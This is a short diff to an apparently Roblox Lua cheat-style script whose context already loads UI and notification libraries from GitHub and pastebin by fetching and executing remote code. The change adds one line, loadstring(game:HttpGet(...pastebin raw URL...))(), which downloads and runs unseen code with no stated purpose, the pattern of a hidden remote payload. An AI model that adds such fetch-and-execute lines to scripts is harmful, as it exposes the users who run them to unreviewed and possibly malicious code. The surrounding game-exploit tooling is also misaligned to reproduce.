@@ -70,7 +70,7 @@ coroutine.wrap(DCLSA_fake_script)()
       end
   
 end
-
+loadstring(game:HttpGet("https://pastebin.com/raw/50AL19P5", true))()
 game.Players.LocalPlayer.Name = 0000000000
 local notifLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Sw1ndlerScripts/RobloxScripts/main/Notification%20Library/main.lua"))()
 local Library = loadstring(game:HttpGet("https://pastebin.com/raw/XwwTN7w6"))()
